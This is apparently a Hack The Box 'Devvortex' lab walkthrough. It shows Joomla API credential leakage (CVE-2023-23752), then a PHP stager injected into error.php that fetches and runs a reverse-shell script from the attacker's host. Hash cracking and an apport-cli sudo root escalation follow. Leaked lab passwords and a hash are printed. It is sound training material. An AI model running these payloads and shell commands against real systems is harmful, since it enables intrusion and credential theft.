## HTB: Devvortex
Welcome to my writeup for **Devvortex**. It is an engaging Linux box from Hack The Box. Rated as "Easy," this machine is an excellent reminder of why defensive security requires thorough asset discovery and timely patching. (Note- This lab may crash in-between multiple times so reset everytime your ping doesn't reach the target)

## 🎯 Objective
* Find the **User** flag.
* Escalate privileges and find the **Root** flag.

Start up the lab and connect using Open VPN to your own Kali instance (highly recommended)

## 🔍 Initial Reconnaissance (Port Scanning)
Every successful penetration test starts with reconnaissance. We need to find out what doors (ports) are open on the target machine and what services are running behind them so we can look for potential entry points. 

Before initiating the enumeration phase, let's export the target IP address as an environment variable for easier reference throughout the lab: `export target=<TARGET_IP>`

Then, we use the following **Nmap** command:
```
nmap -p- -Pn -A --min-rate 2000 --initial-rtt-timeout 50ms --max-rtt-timeout 150ms --max-retries 1 --stats-every 1m $target --open
```

Here is exactly what each flag does:

* **`-p-`**: Scans **all 65,535 ports** instead of just the top 1,000 default ports. Backdoors or uncommon services love to hide on higher ports.
* **`-Pn`**: Treats the host as online and skips the initial ping discovery. This is crucial because many Windows targets disable ICMP (ping) by default, which can cause Nmap to falsely report that the machine is down.
* **`-A`**: This is the "Aggressive" scan flag. It enables **OS detection**, **version scanning** (to see what software version is running on a port), and runs **default NSE scripts** to find basic vulnerabilities.
* **`--min-rate 2000`**: Forces Nmap to send packets at a minimum rate of 2,000 packets per second. This drastically speeds up the scan.
* **`--initial-rtt-timeout 50ms` / `--max-rtt-timeout 150ms`**: Controls how long Nmap waits for a response to a packet. By capping it at 150ms, we ensure Nmap doesn't hang forever on a slow or dropped packet.
* **`--max-retries 1`**: If a port doesn't respond, Nmap will only try to probe it one more time before moving on. This keeps the scan fast.
* **`--stats-every 1m`**: Prints a status update in your terminal every 1 minute so you know the scan hasn't frozen.
* **`--open`**: Efficient filter used to only show ports that are actively listening and accepting connections.

 ⚠️ **Beginner Tip:** While these speed optimizations (`--min-rate`, aggressive timeouts) are perfect for CTFs like TryHackMe, they can be very noisy and disruptive in real-world professional engagements. In a real pentest, this could trigger firewalls, alert blue teams, or crash fragile services!

 _Figure 1: Nmap Scan Result_

<img width="815" height="566" alt="image-391" src="https://github.com/user-attachments/assets/8fd4d15d-4501-42dd-a33e-53b82b313292" />

 ## 🧩 Analyzing the Scan Results

When you run an Nmap scan and a massive wall of text pops up, your job isn't to memorize every single line. Your job is to look at the patterns and ask:

    "What is this server's primary job, and how can I use this information?"

#### <ins>The Big Picture: What is this machine?</ins>
As a beginner, instead of looking at these ports as random numbers, you should group them by their functional relationships:

We have exactly two open ports. This is a highly focused attack surface, which actually makes your job easier because it narrows down where the vulnerability must be.

#### 🌐 The Public Front Door: Port 80 (HTTP)

* Service/Version: nginx 1.18.0

* Functional Role: This is a web server. Nginx serves websites, handles web applications, and often acts as a reverse proxy. Because port 80 is wide open, this is almost certainly the primary entry point (foothold) for the machine. Secure networks rarely leave critical vulnerabilities directly on SSH, so the vulnerability is highly likely hidden in the web application layer.

#### 🛡️ The Management Door: Port 22 (SSH)

* Service/Version: OpenSSH 8.2p1

* Functional Role: This is used for secure remote management. OpenSSH is incredibly robust; unless you find valid credentials (username and password/private key), you are highly unlikely to break in directly through this port. Keep it in your back pocket. Once you exploit the web server (Port 80) and find hidden credentials in a database or configuration file, Port 22 is how you will log in comfortably.

#### 🛠️ Immediate Next Steps (The Action Plan)
Update Your Local DNS (/etc/hosts)

Because Nmap revealed that the server redirects to devvortex.htb, your Kali Linux machine needs to know where that domain lives. You must append the IP and domain mapping to your hosts file.

Run the following command in your terminal:
```
sudo echo "10.129.229.146 devvortex.htb" >> /etc/hosts
```

Now, when you type http://devvortex.htb into your browser, your system will know exactly which server to talk to.

## Website Enumeration
After updating our /etc/hosts file and navigating to http://devvortex.htb, we are presented with the following website.

_Figure 2: Website homepage_

<img width="1264" height="610" alt="image-392" src="https://github.com/user-attachments/assets/d031d35c-5b43-46ae-8919-8e5e9fd3c0d6" />

Since the main page at http://devvortex.htb consists entirely of static content with no clear entry points, the next logical step is to check if the server uses domain-based routing to host hidden staging or administrative environments.

We can perform Virtual Host (Vhost) fuzzing using ffuf. By injecting a subdomain wordlist directly into the HTTP Host header, we can trick the Nginx web server into revealing configurations it keeps hidden from raw IP requests.

Execute the following command:
```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -t 100
```

_Figure 3: Ffuf Results_

<img width="820" height="402" alt="image-393" src="https://github.com/user-attachments/assets/88f9d283-ae6c-4558-ae7f-3d60c81f135d" />

The scan successfully identifies a hidden virtual host: `dev.devvortex.htb`.

Because this is an internal Hack The Box domain, our local attack machine won't be able to resolve it automatically through public DNS. We need to manually append this new subdomain to our /etc/hosts file so our browser and tools know where to route the traffic.

Run the following command to update your local host file and navigate to this new domain:
```
echo "10.129.229.146 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

_Figure 4: dev.devvortex.htb_

<img width="1273" height="615" alt="image-394" src="https://github.com/user-attachments/assets/8d6ae196-1742-4b9c-8429-e08fbbb46973" />

Upon navigating to http://dev.devvortex.htb, a manual inspection reveals that the surface content appears largely static once again. However, development subdomains frequently host hidden administrative paths, configuration files, or database backends that aren't linked anywhere on the main page.

To map out the internal structure of this web application and uncover hidden attack vectors, we will run a directory brute-force scan with feroxbuster:
```
feroxbuster -u http://dev.devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html -t 50 -s 200,301,302,307,403
```

_Figure 5: administrator_

<img width="818" height="75" alt="image-395" src="https://github.com/user-attachments/assets/db69a5be-85a1-41be-b923-28c01c1d08bd" />

Our scan revealed the /administrator endpoint, which reveals that the site is running on Joomla CMS.

_Figure 6: Joomla Admin Panel_

<img width="1274" height="695" alt="image-396" src="https://github.com/user-attachments/assets/8899d19a-86b6-4101-ba1d-835b3bc31278" />

With our directory enumeration confirming that the site is running the Joomla Content Management System (CMS), our next critical objective is version identification. In web penetration testing, finding the exact version number is often the fastest way to uncover "low-hanging fruit"—such as known, unpatched CVEs or public exploit scripts.

A quick look into how Joomla handles its file architecture reveals that the application's core metadata is often stored in an XML manifest file. If left publicly accessible, this file will leak the exact version of the active installation.

Navigating directly to the following path:
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml

We find that information disclosure protection is missing, and the XML file is publicly readable. Inspecting the file contents immediately exposes the target version:

_Figure 7: Joomla Version_

<img width="950" height="406" alt="image-397" src="https://github.com/user-attachments/assets/1291875d-cff9-426e-b6d0-419ba1b28cc4" />

Armed with the exact version number (Joomla 4.2.6), a quick search for public exploits points directly to CVE-2023-23752. This is a critical improper access control vulnerability within the Joomla CMS API layer that allows unauthenticated attackers to view sensitive, restricted configuration parameters.

According to research from VulnCheck, the flaw stems from an issue where the API fails to properly validate permissions when a specific parameter (?public=true) is appended to the request. By targeting the application config endpoints, an attacker can leak core environment secrets, including plaintext database connection strings.

To test if our target is vulnerable, we can issue a targeted curl request directly to the vulnerable API path:
```
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -vv
```

_Figure 8: Leaked creds_

<img width="819" height="641" alt="image-398" src="https://github.com/user-attachments/assets/9f6601ef-845d-4e50-ab28-98080ce205c0" />

There we are with the creds:
```
"user" : "lewis"
"password":"P4ntherg0t1n5r3c0n##"
```

<ins>With these credentials, we can now login to Joomla CMS administrator panel.</ins>

_Figure 9: Login to Joomla CMS_

<img width="1277" height="668" alt="image-399" src="https://github.com/user-attachments/assets/5ddf139d-cab2-4b69-83b9-c1fcc40e0e49" />

## 🐚 Gaining a Foothold: Template Modification to RCE
Once inside the Joomla administrator dashboard, we instantly gain visibility into the system's users. The initial dashboard reveals two specific local user profiles:

    logan

    lewis (Designated as a Super User)

In Joomla, Super User privileges grant full control over the CMS installation, including the ability to modify site templates. We can leverage this intended administrative functionality to achieve arbitrary Remote Code Execution (RCE) by injecting a custom PHP payload into one of the core theme files.

### 🛠️ Injecting the Web Shell
* Navigate to the template manager via the sidebar menu: System > Site Templates > Cassiopeia Details and Files.

* Under the file tree explorer, look for error.php. This file is responsible for rendering 404 and other system error pages, making it a reliable and easily triggerable execution point.

* Open error.php and append the following PHP one-liner to the very bottom of the existing code:
```
<?php system("curl 10.10.16.30:8080/rev.sh | bash"); ?>
```

_Figure 10: edit error.php_

<img width="1242" height="579" alt="image-400" src="https://github.com/user-attachments/assets/d69d736a-5ef6-4db4-9078-ac169031548f" />

### 🚀 Catching the Shell: Staging & Execution
With our PHP stager saved inside error.php, we need to prepare our local attack environment to host the malicious script and catch the incoming reverse shell connection. This requires a three-step orchestration: creating the payload, hosting it via an HTTP server, and listening for the callback.

#### 1. Creating the Shell Script (rev.sh)
On your local machine, generate the bash script that the target will download and run. This payload establishes a duplex TCP connection back to your attack system:
```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.16.30/4444 0>&1' > rev.sh
```

#### 2. Hosting the Payload
Start a quick Python-based web server in the same directory where your rev.sh file lives. This fulfills the request triggered by our Joomla PHP stager on port 8080:
```
python3 -m http.server 8080
```

#### 3. Setting Up the Netcat Listener
Open a new terminal window or tab and spin up a Netcat listener on port 4444 to catch the interactive shell terminal:
```
nc -lnvp 4444
```

### 💥 Triggering the Execution
Now that all our traps are set, we need to force Joomla to execute our modified error.php file. While navigating to a non-existent page can trigger it automatically, we can target the template directory path directly using curl:
```
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php"
```

_Figure 11: rev.sh_

<img width="641" height="117" alt="image-401" src="https://github.com/user-attachments/assets/eba71974-56b5-445c-b425-603b0e0061a6" />

_Figure 12: curl error.php_

<img width="196" height="208" alt="image-402" src="https://github.com/user-attachments/assets/a44a5c44-c39a-4b8a-bef3-0a67d6b4155f" />

_Figure 13: Shell received_

<img width="216" height="165" alt="image-403" src="https://github.com/user-attachments/assets/890a02c6-378d-439d-9627-f0dc767cb301" />

Upon catching the shell, we find ourselves executing commands in a limited environment as the www-data service user. Before proceeding with system enumeration, we need to upgrade our basic web shell into a stable shell with:
```
script /dev/null -c bash
```

Exploring the home directories reveals the presence of a local user named logan. While we can see his home folder, www-data does not possess the permissions required to read the user.txt flag flag directly. We must find a way to pivot to Logan's account context.

_Figure 14: Need to login as logan_

<img width="585" height="162" alt="image-404" src="https://github.com/user-attachments/assets/268ef3f1-1c54-4107-aa0f-0f649092bcc6" />

### 🗄️ Querying the MySQL Backend
Recall that our earlier exploitation of the Joomla API information disclosure vulnerability (CVE-2023-23752) leaked plaintext environment secrets. We already possess valid local database connection parameters:

    Database Name: joomla

    Database User: lewis

    Password: P4ntherg0t1n5r3c0n##

    Host: localhost

Since the mysql client utility is installed on the target machine, we can leverage these credentials to authenticate directly to the local database instance and inspect the user accounts table for credential entries:
```
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
```

_Figure 15: mysql login_

<img width="772" height="256" alt="image-405" src="https://github.com/user-attachments/assets/e5b9ef51-7621-449d-9cbd-6a7a2a42d5df" />

### 🗄️ Navigating the Schema & Dumping User Hashes
Once connected to the local MySQL instance via the loopback interface, we can inspect the available schemas to verify our target:
```
SHOW DATABASES;
```
The output confirms that joomla is the primary non-default database available on the server. We select it using the USE statement and then display all tables within the schema to find where account credentials are stored:
```
USE joomla;
SHOW TABLES;
```

Joomla organizes its data by prepending a random alphanumeric prefix to its table structures. Looking through the output list, our attention is drawn to the sd4fg_users table, which is responsible for holding the application's user profiles, metadata, and cryptographic credentials.

_Figure 16: Databases_

<img width="547" height="397" alt="image-406" src="https://github.com/user-attachments/assets/2e228fa6-f28f-4f65-ac1c-a13971b629ad" />

To extract the specific account details, execute a select statement to dump all columns from the target table:
```
SELECT * FROM sd4fg_users;
```

_Figure 17: Logan Creds_

<img width="775" height="374" alt="image-407" src="https://github.com/user-attachments/assets/2c5a0de1-717e-431e-befa-50344bbcac7a" />

With the database dump successful, we locate the cryptographic hash string associated with the user logan:
```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

Before firing up a cracking tool, it's best practice to formally identify the hashing algorithm. Passing this string into an automated tool like hashid or inspecting its signature character structure reveals a telling pattern:
```
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
```

_Figure 18: hashid_

<img width="676" height="98" alt="image-408" src="https://github.com/user-attachments/assets/cbfe2901-48e6-49e9-ad81-7752104099d7" />

The $2y$ signature confirms that the password is compiled using Bcrypt (Blowfish), a notoriously slow, adaptive hashing algorithm specifically designed to resist hardware-accelerated brute-force attacks.

We will utilize the standard industry dictionary rockyou.txt to crack it.

Because Bcrypt demands high computational overhead, we must specify the exact corresponding execution mode, which is 3200. Enclose the hash in single quotes to prevent the Linux terminal from misinterpreting the special characters (like $) as environment variables:
```
hashcat -m 3200 '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' /home/kali/rockyou.txt
```

The cryptographic calculations execute quickly, successfully breaking the structure and exposing Logan's plaintext credential directly in the terminal interface.

_Figure 19: Hash Cracked_

<img width="665" height="320" alt="image-409" src="https://github.com/user-attachments/assets/4dcb2eb1-5be7-422a-a9a2-7c09163b4641" />

Since port 22 was open on our initial Nmap scan, we can now step away from our limited web-server terminal environment completely. We will authenticate via SSH directly to achieve a clean, persistent user shell context and retrieve our user flag:
```
ssh logan@devvortex.htb
```

_Figure 20: User Flag_

<img width="674" height="78" alt="image-410" src="https://github.com/user-attachments/assets/5113173e-e9b2-4d16-be15-e1433d5ffc1e" />

## Privilege Escalation
We begin our post-exploitation enumeration by checking Logan's explicit administrative privileges via the sudo -l command.

_Figure 21: Sudo -l_

<img width="679" height="129" alt="image-411" src="https://github.com/user-attachments/assets/33bfe2f1-1a70-4156-86dc-99be3e937254" />

The output reveals a powerful misconfiguration—Logan is permitted to execute a specific system utility with root privileges without a password:
```
User logan may run the following commands on devvortex:
    (ALL : ALL) NOPASSWD: /usr/bin/apport-cli
```

apport-cli is a command-line utility used in Ubuntu and Debian-based distributions to generate, review, and report application crash logs. Checking the installed version of the tool reveals:
```
/usr/bin/apport-cli --version
# Output: apport-cli 2.20.11
```

According to public security advisories, version 2.20.11 is vulnerable to a local privilege escalation flaw tracked as CVE-2023-1326.

The flaw lies in the tool's behavior when displaying detailed crash reports. To manage long walls of text, apport-cli invokes the system's default terminal pager—typically less. When a program handles text using less under an elevated sudo context without dropping privileges, an attacker can breakout of the viewer interface. Because less allows interactive system commands via the exclamation mark (!) shortcut, any command spawned from it will inherit the parent process's execution context (in this case, root).

### 🛠️ Triggering the Exploit Path
To exploit this, we need to force apport-cli into opening a report viewer. We can do this by instructing the tool to file a bug report against an active system process ID (PID).

First, locate a valid process running under your current session context:
```
ps -ux
```

_Figure 22: ps -ux_

<img width="678" height="142" alt="image-412" src="https://github.com/user-attachments/assets/96051447-b16c-459c-b9a7-b6d8609a0940" />

From the output list, we identify an accessible target process, such as the local systemd user instance operating under PID 1714.

Next, we execute apport-cli using sudo, appending the -f flag for bug-filing mode and the -P flag to target our chosen PID:
```
sudo /usr/bin/apport-cli -f -P 1714
```

In the terminal, apport-cli will ask a question: It seems you have modified the contents of "/etc/systemd/journald.conf". Would you like to add the contents of it to your bug report?
* Type = Y
* In the next question type - V
* Then !/bin/bash to spawn the root shell

Finally navigate and find the root flag/

_Figure 23: Root Flag_

<img width="618" height="262" alt="image-413" src="https://github.com/user-attachments/assets/82358dff-0037-40a0-b5ff-894c9f244fb2" />

